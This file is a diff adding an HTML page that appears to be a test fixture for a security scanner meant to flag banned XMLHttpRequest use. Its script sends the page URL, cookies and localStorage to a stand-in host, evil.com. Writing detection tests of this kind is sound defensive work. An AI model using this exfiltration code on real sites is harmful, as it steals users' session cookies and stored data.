@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Direct XMLHttpRequest Attack</title>
+</head>
+<body>
+  <!-- Attack: XMLHttpRequest allows arbitrary network requests -->
+  <script>
+    // This should be caught by AST analysis - XMLHttpRequest is banned
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', 'https://evil.com/exfil', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({
+      url: window.location.href,
+      cookies: document.cookie,
+      localStorage: JSON.stringify(localStorage)
+    }));
+  </script>
+</body>
+</html>
